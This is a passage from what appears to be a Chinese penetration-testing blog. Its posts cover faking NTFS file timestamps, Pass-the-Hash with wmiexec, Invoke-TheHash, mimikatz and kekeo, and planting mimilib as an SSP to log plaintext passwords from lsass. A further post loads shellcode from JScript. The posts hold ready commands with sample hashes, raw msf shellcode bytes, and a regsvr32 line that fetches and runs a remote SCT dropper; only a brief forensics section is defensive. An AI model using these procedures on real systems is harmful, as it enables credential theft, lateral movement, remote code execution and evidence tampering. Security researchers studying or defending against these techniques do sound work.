  <li>将文件A的时间复制到文件B</li>
</ul>

<h3 id="2使用ntqueryinformationfile和ntsetinformationfile">2、使用NtQueryInformationFile和NtSetInformationFile</h3>

<p>能够操作四个文件属性：</p>

<ul>
  <li>CreateTime(Created)</li>
  <li>AccessTime(Accessed)</li>
  <li>LastWriteTime(Modified)</li>
  <li>MFTChangeTime</li>
</ul>

<p>我在实现上直接引用了Metasploit中timestomp的代码，地址如下：</p>

<p>https://github.com/rapid7/meterpreter/blob/master/source/extensions/priv/server/timestomp.c</p>

<p>添加了部分功能，下载地址：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/FileTimeControl_NTAPI.cpp</p>

<p>代码实现了以下功能：</p>

<ul>
  <li>查看文件的时间(CreateTime,AccessTime,LastWriteTime，MFTChangeTime)</li>
  <li>修改文件的时间</li>
  <li>将文件A的时间复制到文件B</li>
  <li>将时间设置为最小值(1601-01-01 00:00:00)</li>
</ul>

<p><strong>注：</strong></p>

<p>暂时不支持对文件夹的操作</p>

<h3 id="3使用驱动文件">3、使用驱动文件</h3>

<h4 id="1-setmace">(1) SetMace</h4>

<p>可供参考的下载地址：</p>

<p>https://github.com/jschicht/SetMace</p>

<p>SetMace能够正常读取文件和文件夹的时间信息(包括MFTChangeTime)</p>

<p>但无法修改时间信息，这是因为自nt6.x开始，Windows禁止加载未经签名的驱动文件，如果能够绕过驱动保护，就能修改时间信息</p>

<h4 id="2-winhex">(2) WinHex</h4>

<p>付费版的WinHex支持对硬盘文件的写入操作，可以用来修改时间信息</p>

<h3 id="补充文件资源克隆">补充、文件资源克隆</h3>

<p>通过powershell实现自动化调用Resource Hacker，对可执行文件(exe，dll，scr等)的资源信息进行克隆</p>

<p>下载地址：</p>

<p>https://github.com/threatexpress/metatwin</p>

<p><strong>注：</strong></p>

<p>这个工具不会修改文件属性</p>

<h2 id="0x04-利用思路">0x04 利用思路</h2>
<hr>

<h3 id="1在目标系统上释放文件">1、在目标系统上释放文件</h3>

<p>将会改变父目录的时间属性(AccessTime,LastWriteTime,MFTChangeTime)</p>

<p>可以使用<a href="https://github.com/jschicht/SetMace">SetMace</a>查看属性的变化</p>

<p>修改文件夹的时间属性可使用0x03中的<a href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/FileTimeControl_WinAPI.cpp">FileTimeControl_WinAPI</a>，能够修改以下三项内容：</p>

<ul>
  <li>CreateTime(Created)</li>
  <li>AccessTime(Accessed)</li>
  <li>LastWriteTime(Modified)</li>
</ul>

<p>想要进一步清除操作痕迹，需要借助WinHex修改Master File Table中的<code class="language-plaintext highlighter-rouge">$STANDARD_INFORMATION</code>(偏移0x10)和<code class="language-plaintext highlighter-rouge">$FILE_NAME</code>(偏移0x30)</p>

<h3 id="2覆盖目标系统上原有的文件">2、覆盖目标系统上原有的文件</h3>

<p>将会改变原有文件的时间属性(CreateTime,AccessTime,LastWriteTime,MFTChangeTime)</p>

<p>可以使用FileTimeControl_NTAPI读取和修改时间属性</p>

<p>想要进一步清除操作痕迹，需要借助WinHex修改Master File Table中的<code class="language-plaintext highlighter-rouge">$STANDARD_INFORMATION</code>(偏移0x10)和<code class="language-plaintext highlighter-rouge">$FILE_NAME</code>(偏移0x30)</p>

<h2 id="0x05-取证建议">0x05 取证建议</h2>
<hr>

<p>1、查看文件/文件夹的时间属性MFTChangeTime，位于两个位置：</p>

<ul>
  <li>Master File Table中的<code class="language-plaintext highlighter-rouge">$STANDARD_INFORMATION</code>(偏移0x10)</li>
  <li>Master File Table中的<code class="language-plaintext highlighter-rouge">$FILE_NAME</code>(偏移0x30)</li>
</ul>

<p>如果MFTChangeTime存在异常(时间晚于其他三个)，一般情况下可认为该文件被非法修改</p>

<p>可使用工具<a href="https://github.com/jschicht/SetMace">SetMace</a></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了修改文件属性的方法和细节，分享两个实现代码(<a href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/FileTimeControl_WinAPI.cpp">FileTimeControl_WinAPI</a>和<a href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/FileTimeControl_NTAPI.cpp">FileTimeControl_NTAPI</a>)，结合利用思路给出在取证上的建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 28, 2018
  </div>

  
</article><article class="post">
  <h1>域渗透——Pass The Hash的实现</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章《域渗透——Pass The Hash &amp; Pass The Key》曾介绍过kb2871997对Pass The Hash的影响。本文将站在另一个角度，介绍Pass The Hash的相关实现</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Pass The Hash的原理</li>
  <li>常用工具</li>
  <li>mimikatz中的Pass The Hash</li>
  <li>mimikatz中的Pass The Ticket</li>
</ul>

<h2 id="0x02-pass-the-hash的原理">0x02 Pass The Hash的原理</h2>
<hr>

<p>可参考Wikipedia的介绍，地址如下：</p>

<p>https://en.wikipedia.org/wiki/Pass_the_hash</p>

<p>提取出关键信息：</p>

<ul>
  <li>在Windows系统中，通常会使用NTLM身份认证</li>
  <li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li>
  <li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li>
  <li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li>
</ul>

<p><strong>注：</strong></p>

<p>mimikatz支持导出内存中用户的LM hash，但前提是Windows系统支持LM hash</p>

<p>Windows Server 2008启用LM hash的方法：</p>

<p><code class="language-plaintext highlighter-rouge">gpedit.msc</code>-<code class="language-plaintext highlighter-rouge">计算机配置</code>-<code class="language-plaintext highlighter-rouge">Windows 设置</code>-<code class="language-plaintext highlighter-rouge">安全设置</code>-<code class="language-plaintext highlighter-rouge">本地策略</code>-<code class="language-plaintext highlighter-rouge">安全选项</code></p>

<p>找到<code class="language-plaintext highlighter-rouge">网络安全︰ 不要在下次更改密码存储 LAN 管理器的哈希值</code>，选择<code class="language-plaintext highlighter-rouge">已禁用</code></p>

<p>系统下一次更改密码后，就能够导出LM hash</p>

<h2 id="0x03-常用工具">0x03 常用工具</h2>
<hr>

<p>当我们获得某个用户的口令hash，并且条件限定我们不去破解明文口令，实现Pass The Hash都有哪些工具呢？</p>

<h3 id="1kali下的工具">1、Kali下的工具</h3>

<h4 id="1-meterpreter">(1) meterpreter</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/psexec_psh
</code></pre></div></div>

<h4 id="2-工具集">(2) 工具集</h4>

<p>位于<code class="language-plaintext highlighter-rouge">密码攻击</code>-<code class="language-plaintext highlighter-rouge">Passing the Hash</code>下，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/1215.png" alt="Alt text"></p>

<p>包含多种利用工具</p>

<h3 id="2windows系统下的工具">2、Windows系统下的工具</h3>

<h4 id="1-python">(1) python</h4>

<p><strong>wmiexec：</strong></p>

<p>参考地址：</p>

<p>https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</p>

<p>exe版本下载地址：</p>

<p>https://github.com/maaaaz/impacket-examples-windows</p>

<p><strong>注：</strong></p>

<p>wmiexec.py的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可</p>

<p>参数实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmiexec -hashes 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1 TEST/test1@192.168.1.1 "whoami"
</code></pre></div></div>

<p>wmiexec.py的hash参数格式为<code class="language-plaintext highlighter-rouge">LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值</p>

<h4 id="2-powershell">(2) powershell</h4>

<p>参考地址：</p>

<p>https://github.com/Kevin-Robertson/Invoke-TheHash/</p>

<p>支持多种方式</p>

<p><strong>Invoke-WMIExec：</strong></p>

<p>参数实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-WMIExec -Target 192.168.1.1 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "calc.exe" -verbose
</code></pre></div></div>

<p>类似wmiexec.py</p>

<p><strong>Invoke-SMBExec：</strong></p>

<p>支持SMB1, SMB2 (2.1), and SMB signing</p>

<p>参数实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-SMBExec -Target 192.168.0.2 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "calc.exe" -verbose
</code></pre></div></div>

<p>通过在目标主机创建服务执行命令，所以权限为system</p>

<p><strong>Invoke-SMBClient：</strong></p>

<p>支持SMB1, SMB2 (2.1), and SMB signing</p>

<p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p>

<p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>

<h4 id="3-mimikatz">(3) mimikatz</h4>

<p><strong>Pass-The-Hash：</strong></p>

<p>实际上为Overpass-the-hash</p>

<p>参数实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege：：debug
sekurlsa::pth /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息</p>

<p>对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash</p>

<p><strong>Pass-The-Ticket：</strong></p>

<p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p>

<p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载地址：</p>

<p>https://github.com/gentilkiwi/kekeo</p>

<p>参数实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1"
</code></pre></div></div>

<p>执行后生成票据<code class="language-plaintext highlighter-rouge">TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi</code></p>

<p>接下来导入票据：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"
</code></pre></div></div>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文列举了多种实现Pass The Hash的工具，欢迎补充</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 15, 2017
  </div>

  
</article><article class="post">
  <h1>Mimikatz中SSP的使用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Mimikatz中的mimilib(ssp)和<code class="language-plaintext highlighter-rouge">misc::memssp</code>同<code class="language-plaintext highlighter-rouge">sekurlsa::wdigest</code>的功能相同，都能够从lsass进程中提取凭据，通常可获得已登录用户的明文口令(Windows Server 2008 R2及更高版本的系统默认无法获得），但实现原理不同，所以绕过高版本限制的方法也不同</p>

<p>我对XPN的第二篇文章进行了学习，对这个技术有了新的认识，于是尝试对这个技术进行总结，添加一些个人的理解</p>

<p>XPN的博客：</p>

<p>https://blog.xpnsec.com/exploring-mimikatz-part-2/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>SSP简介</li>
  <li>如何开发SSP</li>
  <li>如何枚举和删除SSP</li>
  <li>添加SSP的三种方法</li>
  <li>memssp修改内存的方法</li>
</ul>

<h2 id="0x02-ssp简介">0x02 SSP简介</h2>
<hr>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn751052(v=ws.11)</p>

<p>SSP，全称Security Support Provider，又名Security Package</p>

<p>SSPI，全称Security Support Provider Interface，是Windows系统在执行认证操作所使用的API</p>

<p>简单的理解为SSPI是SSP的API接口</p>

<p>SSP默认包括以下几种：</p>

<ul>
  <li>Kerberos Security Support Provider</li>
  <li>NTLM Security Support Provider</li>
  <li>Digest Security Support Provider</li>
  <li>Schannel Security Support Provider</li>
  <li>Negotiate Security Support Provider</li>
  <li>Credential Security Support Provider</li>
  <li>Negotiate Extensions Security Support Provider</li>
  <li>PKU2U Security Support Provider</li>
</ul>

<p>用户可以自己开发并添加SSP，能够对系统中某些身份验证和授权事件进行操作</p>

<p>本文只涉及如何添加SSP从lsass进程中提取明文凭据</p>

<h2 id="0x03-如何开发ssp">0x03 如何开发SSP</h2>
<hr>

<p>SSP是一个dll，不同的功能对应不同的导出函数</p>

<p>mimikatz中的mimilib不仅可以作为SSP，还包含其他功能</p>

<p>实现从lsass进程中提取凭据的导出函数为<code class="language-plaintext highlighter-rouge">SpLsaModeInitialize</code></p>

<p>想要提取出这个功能，可以删除其他导出函数，修改后的mimilib.def内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LIBRARY
EXPORTS
SpLsaModeInitialize		=	kssp_SpLsaModeInitialize
</code></pre></div></div>

<p>mimilib从lsass进程中提取明文凭据的实现代码：</p>

<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kssp.c</p>

<p>实现代码中包括以下四个函数：</p>

<ol>
  <li>
    <p>SpInitialize
用于初始化SSP并提供函数指针列表</p>
  </li>
  <li>
    <p>SpShutDown
被称为卸载SSP</p>
  </li>
  <li>
    <p>SpGetInfo
提供有关SSP的信息，包括版本，名称和说明
在枚举SSP(方法在后面会介绍)时会显示这些信息</p>
  </li>
  <li>
    <p>SpAcceptCredentials
接收LSA传递的明文凭证，由SSP缓存
mimilib在这里实现了将明文凭证保存在文件<code class="language-plaintext highlighter-rouge">c:\windows\system32\kiwissp.log</code>中</p>
  </li>
</ol>

<h2 id="0x04-如何枚举和删除ssp">0x04 如何枚举和删除SSP</h2>
<hr>

<h3 id="1-枚举ssp">1. 枚举SSP</h3>

<p>测试代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define SECURITY_WIN32

#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;Security.h&gt;
#pragma comment(lib,"Secur32.lib")

int main(int argc, char **argv) {
	ULONG packageCount = 0;
	PSecPkgInfoA packages;

	if (EnumerateSecurityPackagesA(&amp;packageCount, &amp;packages) == SEC_E_OK) {
		for (int i = 0; i &lt; packageCount; i++) {
			printf("Name: %s\nComment: %s\n\n", packages[i].Name, packages[i].Comment);
		}
	}
}
</code></pre></div></div>

<p><strong>注:</strong></p>

<p>代码引用自XPN的文章</p>

<p>默认结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-6-12/2-1.png" alt="Alt text"></p>

<h3 id="2-删除ssp">2. 删除SSP</h3>

<p>测试代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define SECURITY_WIN32

#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;Security.h&gt;
#pragma comment(lib,"Secur32.lib")


int main(int argc, char **argv) {

	SECURITY_STATUS SEC_ENTRYnRet = DeleteSecurityPackageA(argv[1]);
	printf("DeleteSecurityPackageA return with 0x%X\n", SEC_ENTRYnRet);

}
</code></pre></div></div>

<p>经测试，无法删除任一SSP，一直都是报错，提示<code class="language-plaintext highlighter-rouge">0x80090302</code></p>

<p>经过搜索发现，找到相同结果的文章：</p>

<p>http://cybernigma.blogspot.com/2014/03/using-sspap-lsass-proxy-to-mitigate.html</p>

<p>猜测微软并没开放这个功能，也就是说，在系统不重启的情况下无法删除SSP</p>

<p><strong>补充：</strong></p>

<p>卸载进程中的dll可使用以下代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/FreeDll.cpp</p>

<h2 id="0x05-添加ssp的三种方法">0x05 添加SSP的三种方法</h2>
<hr>

<p>这里以mimilib.dll为例</p>

<h3 id="方法1">方法1：</h3>

<p>(1)复制文件</p>

<p>将mimilib.dll复制到<code class="language-plaintext highlighter-rouge">c:\windows\system32</code>下</p>

<p>64位系统要用64位的mimilib.dll，32位系统使用32位的mimilib.dll</p>

<p>(2)修改注册表</p>

<p>位置<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\</code></p>

<p><code class="language-plaintext highlighter-rouge">Security Packages</code>的值设置为<code class="language-plaintext highlighter-rouge">mimilib.dll</code></p>

<p>(3)等待系统重新启动</p>

<p>系统重新启动后，在<code class="language-plaintext highlighter-rouge">c:\windows\system32</code>生成文件<code class="language-plaintext highlighter-rouge">kiwissp.log</code>，记录当前用户的明文口令</p>

<h3 id="方法2使用api-addsecuritypackage">方法2：使用API AddSecurityPackage</h3>

<p>(1)复制文件</p>

<p>同方法1</p>

<p>(2)修改注册表</p>

<p>同方法1</p>

<p>(3)调用AddSecurityPackage</p>

<p>测试代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define SECURITY_WIN32

#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;Security.h&gt;
#pragma comment(lib,"Secur32.lib")


int main(int argc, char **argv) {
	SECURITY_PACKAGE_OPTIONS option;
	option.Size = sizeof(option);
	option.Flags = 0;
	option.Type = SECPKG_OPTIONS_TYPE_LSA;
	option.SignatureSize = 0;
	option.Signature = NULL;
	SECURITY_STATUS SEC_ENTRYnRet = AddSecurityPackageA("mimilib", &amp;option);
	printf("AddSecurityPackage return with 0x%X\n", SEC_ENTRYnRet);
}
</code></pre></div></div>

<p>添加成功，如果此时输入了新的凭据(例如runas，或者用户锁屏后重新登录)，将会生成文件<code class="language-plaintext highlighter-rouge">kiwissp.log</code></p>

<p>方法2的自动化实现：</p>

<p>https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/persistence/Install-SSP.ps1</p>

<h3 id="方法3使用rpc控制lsass加载ssp">方法3：使用RPC控制lsass加载SSP</h3>

<p>XPN开源的代码：</p>

<p>https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e</p>

<p>我在VS2015下使用，代码需要简单修改一下</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-6-12/2-2.png" alt="Alt text"></p>

<p>添加成功</p>

<p>这是一个很棒的方法，有以下优点：</p>

<ul>
  <li>不需要写注册表</li>
  <li>不调用API AddSecurityPackage</li>
  <li>不需要对lsass进程的内存进行写操作</li>
  <li>lasss进程中不存在加载的dll</li>
</ul>

<h2 id="0x06-memssp修改内存的方法">0x06 memssp修改内存的方法</h2>
<hr>

<p>这是mimikatz中的功能，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>misc::memssp
</code></pre></div></div>

<p>通过修改lsass进程的内存，实现从lsass进程中提取凭据</p>

<p>命令执行后，如果此时输入了新的凭据(例如runas，或者用户锁屏后重新登录)，将会在<code class="language-plaintext highlighter-rouge">c:\windows\system32</code>下生成文件<code class="language-plaintext highlighter-rouge">mimilsa.log</code></p>

<p>XPN以mimikatz的代码为模板，以dll的方式实现了相同的功能，可以通过RPC(0x05中的方法3)或者LoadLibrary进行加载</p>

<p>代码地址：</p>

<p>https://gist.github.com/xpn/93f2b75bf086baf2c388b2ddd50fb5d0</p>

<p>代码适用于<code class="language-plaintext highlighter-rouge">WIN_BUILD_10_1703x64</code>和<code class="language-plaintext highlighter-rouge">WIN_BUILD_10_1809x64</code></p>

<p>其他系统需要修改对应的变量，参考位置：</p>

<p>https://github.com/gentilkiwi/mimikatz/blob/72b83acb297f50758b0ce1de33f722e70f476250/mimikatz/modules/kuhl_m_misc.c#L483</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文结合了XPN的文章，介绍了Mimikatz中的mimilib(ssp)和<code class="language-plaintext highlighter-rouge">misc::memssp</code>从lsass进程中提取凭据的方法，整理了相关技巧，包括开发、添加、枚举SSP和内存patch</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 12, 2019
  </div>

  
</article><article class="post">
  <h1>Study Notes Weekly No.2(Shellcode Via JScript &amp; VBScript)</h1>

  <div class="entry">
    <p><strong>About:</strong></p>

<ul>
  <li>DynamicWrapperX</li>
  <li>Generate shellcode</li>
  <li>Write JS and SCT script</li>
  <li>How to use</li>
  <li>Detection</li>
</ul>

<p><strong>目录：</strong></p>

<ul>
  <li>介绍如何配置使用脚本附加库DynamicWrapperX</li>
  <li>通过JS/VBS实现对win32 API的调用</li>
  <li>如何在js脚本中加载shellcode</li>
  <li>结合sct的攻击思路</li>
  <li>补充在64位下的使用方法</li>
  <li>对该方法的检测</li>
</ul>

<p><strong>Reference:</strong></p>

<p>http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html</p>

<h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p>Casey Smith@subTee近日更新了新的博客，介绍了如何利用脚本附加库DynamicWrapperX实现JS/VBS对win32 API的调用，我很感兴趣，于是对其进行了学习研究。本文用来记录测试心得并补充个人理解。</p>

<h2 id="0x01-dynamicwrapperx简介">0x01 DynamicWrapperX简介</h2>
<hr>

<h3 id="1-下载获得dynwrapxdll">1. 下载获得dynwrapx.dll</h3>

<p><strong>下载地址：</strong></p>

<p>http://www.script-coding.com/dynwrapx_eng.html</p>

<p>注册DynamicWrapperX:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsvr32 /i dynwrapx.dll
</code></pre></div></div>

<p>卸载DynamicWrapperX:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsvr32 /u /i dynwrapx.dll
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>/i表示对当前用户操作，当前用户权限即可；如何不加/i，代表对所有用户操作，需要管理员权限</p>

<p>/s可去掉注册成功弹出的提示框</p>

<h3 id="2-通过jsvbs来调用win32-api">2. 通过JS/VBS来调用win32 API</h3>

<p>注册组件后就可以通过JS/VBS来调用win32 API</p>

<p>js脚本弹框实例:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DX = new ActiveXObject("DynamicWrapperX");                  // Create an object instance.
DX.Register("user32.dll", "MessageBoxW", "i=hwwu", "r=l");  // Register a dll function.
res = DX.MessageBoxW(0, "Hello, world!", "Test", 4);        // Call the function.
</code></pre></div></div>

<p>注册前，js脚本执行失败，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/2-1.png" alt="Alt text"></p>

<p>注册组件，执行</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsvr32 /i dynwrapx.dll
</code></pre></div></div>

<p>再次执行js脚本，成功弹框，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/2-2.png" alt="Alt text"></p>

<p>成功调用win32 API</p>

<p>dynwrapx.dll是一个32位的dll，所以在64位系统下通过regsvr32 /i dynwrapx.dll注册后，在使用js调用win32 API时注意需要选择32位的cscript.exe，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\SysWow64\cscript.exe a.js
</code></pre></div></div>

<p>如图,默认64位cscript.exe无法调用COM组件，换成32位，执行成功</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/2-3.png" alt="Alt text"></p>

<p>vbs脚本弹框实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set DX = CreateObject("DynamicWrapperX")                    ' Create an object instance.
DX.Register "user32.dll", "MessageBoxW", "i=hwwu", "r=l"    ' Register a dll function.
res = DX.MessageBoxW(0, "Hello, world!", "Test", 4)         ' Call the function.
</code></pre></div></div>

<h2 id="0x02-生成shellcode">0x02 生成shellcode</h2>
<hr>
<p>使用msf：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use windows/exec
set CMD calc.exe
generate -t csharp
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/3-1.png" alt="Alt text"></p>

<p>获得shellcode</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] buf = new byte[193] {
0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
</code></pre></div></div>

<h2 id="0x03-js脚本加载shellcode">0x03 js脚本加载shellcode</h2>
<hr>
<p><strong>步骤：</strong></p>

<ol>
  <li>通过VirtualAlloc申请一块具有RWX权限的内存，函数返回值为内存的基地址</li>
  <li>
  <li>向这段内存写入shellcode</li>
  <li>调用CreateThread加载shellcode</li>
</ol>

<p>实例代码如下：</p>

<p>https://gist.github.com/subTee/ca6ab8ec75ec38c213da580cd0de30fe</p>

<p>代码比较简洁，在此不做详细介绍，直接替换其中的shellcode，正常执行，如图
<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/3-2.png" alt="Alt text"></p>

<p><strong>注：</strong>
VirtualAlloc第二个参数表示分配内存的大小，shellcode的长度不要超过这个数值</p>

<p>DynamicWrapperX 1.0提供了英文版说明，可对照语法进行二次开发，参考地址如下：</p>

<p>http://www.script-coding.com/dynwrapx_eng.html</p>

<p>DynamicWrapperX 2.0中默认提供英文帮助文档，语法有细微变化，需要注意</p>

<h2 id="0x04-regsvr32利用方式">0x04 regsvr32利用方式</h2>
<hr>
<p>前面提到过dynwrapx.dll是一个32位的dll，注册的组件也只能供32位程序调用</p>

<p>所以在64位系统下使用需要注意如下：</p>

<ol>
  <li>只支持x86 shellcode</li>
  <li>在64位系统下要使用syswow64文件夹下的32位程序</li>
</ol>

<p>利用方式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\SysWow64\regsvr32.exe /s /u /i:[sct路径] scrobj.dll
</code></pre></div></div>

<p>将js代码写到sct文件中，就可以将其放到服务器上</p>

<p><strong>实现远程调用sct的实例地址：</strong></p>

<p>https://gist.github.com/subTee/ca6ab8ec75ec38c213da580cd0de30fe</p>

<p><strong>自动化download, register dll, execute Shellcode的实例地址：</strong></p>

<p>https://gist.github.com/subTee/aa548b36b5d3c8f07e2024ab39217712</p>

<p>里面多了一个调用certuil.exe对文件进行base64加解密</p>

<p>cmd下执行如下代码实现远程调用sct：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\SysWow64\regsvr32.exe /s /u /i:https://gist.githubusercont
ent.com/subTee/aa548b36b5d3c8f07e2024ab39217712/raw/5dc12c648229574e6172a70ba13f
db220ef1a2e8/Dropper.Sct scrobj.dll
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>使用前需要提前安装DynamicWrapperX</p>

<p>实际测试如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/3-5.png" alt="Alt text"></p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>
<p>最新的DynamicWrapperX已经支持x64，版本为DynamicWrapperX 2.0</p>

<p><strong>相关地址：</strong></p>

<p>http://www.minner.ru/html/Dynwrapx.html</p>

<p>在64位系统上面需要分别注册32位和64位的DynamicWrapperX</p>

<p>64位dll注册成功后，js脚本可直接运行，如图</p>

